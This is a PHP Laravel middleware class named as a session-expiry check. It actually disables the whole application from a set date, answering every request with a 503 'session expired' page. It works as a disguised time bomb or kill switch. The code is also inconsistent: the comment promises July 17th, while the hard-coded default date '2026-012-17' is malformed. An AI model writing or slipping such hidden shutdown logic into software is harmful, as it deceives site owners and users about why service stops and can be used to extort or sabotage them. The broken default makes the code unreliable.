<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Http\Response;

class CheckServerSessionExpired
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next)
    {
        $currentDate = now();
        
        // Get the block date from environment or default to July 17th
        $blockDateString = env('SESSION_EXPIRE_DATE', '2026-012-17');
        $blockDate = \Carbon\Carbon::createFromFormat('Y-m-d', $blockDateString)->startOfDay();
        
        // If we're on or after the block date, show the session expired page
        if ($currentDate->gte($blockDate)) {
            return response()->view('errors.session-expired', [], 503);
        }

        return $next($request);
    }
}
